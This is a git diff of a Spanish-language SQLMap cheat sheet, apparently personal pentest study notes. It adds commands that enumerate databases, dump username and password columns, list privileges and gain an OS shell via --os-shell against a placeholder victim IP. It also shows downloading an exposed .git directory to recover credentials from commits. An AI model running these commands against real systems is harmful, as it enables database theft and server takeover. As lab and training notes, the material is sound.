@@ -182,28 +182,20 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 	# current-user = Muestra el nombre del usuario actual
 	# roles = Muestra el rol de cada usuario 
 ```
-
-```bash 
-❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent -p username 
-
-	# 
-```
-
 ## Ejemplo 1
 
 ```bash 
 ❯ sqlmap -u 'http://site.com/index.php?id=1'    # Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
-```
+
 
 Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se ha clonado un directorio Git y puede suponer un riesgo, porque si tiene la capacidad de 'directory listing'  nos podemos traer los archivos a la maquina de atacante. 
 
-```bash 
+
 ❯ wget -r http://192.168.68.11           # Nos descargarnos de forma recursiva el contenido del dir .git
 ❯ git log                                # Pueder ves los 'commits' y su descripcion de cada cambio 
 ❯ git show <id>                          # puedes ver el contenido de los commit y en algunos casos obtener el registro de credenciales 
-```
 
-```bash 
+
 ❯ sqlmap -u 'http://<IP Victima>' --dbs --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch  # Debemos de colocar la url hasta el parametro que se usa para modificar e inyectar el SQL.
 	# dbs = Haremos que nos enumere las bases de datos, pero antes debemos de estar autenticados 
 	# cookie = "usuario=valor" Colocar la Cookie de Sesion de la web que se encuentra en (Inspector > Storage > Value) o en Burp
@@ -222,11 +214,36 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se
 	# C = Colocas las columnas que quieres dumpear
 	# dump = Mostrar el contenido de las columnas username, password y email
 
+❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D <DB-name> -T <Table-name> -C <username,password> --passwords
+	# password = Enumera el usuario y su password
+
 ❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --risk 3 --level 4   # Esto demora mas tiempo 
 	# risk = Nivel de riesgo 
 	# level = Nivel de profundidad
 
 ❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --os-shell --batch     # Si el servidor interpreta PHP, tenemos permisos, podriamos ganar una consola interactiva 
+```
+
+```bash 
+❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --privileges 
+	# privileges = Muestra los privilegios de un usuario en el gestor de la DB
+```
+
+```bash 
+❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --search users
+	# search = Busca en la DB info especifica relacionada a las tablas o columnas, en este cado 'users'
+	# Opciones:
+		# 1 = Busqueda relacionada a 'users' (Recomendado)
+		# 2 = Busqueda exacta de 'users'
+
+❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --dbms mysql --batch -D dvwa --random-agent -p username --hostname
+	# hostname = Muestra el nombre del servidor que contiene la app vulnerable 
+```
+
+## Fuerza bruta 
+
+```bash 
+
 ```
 
 ## Ejemplo 2  
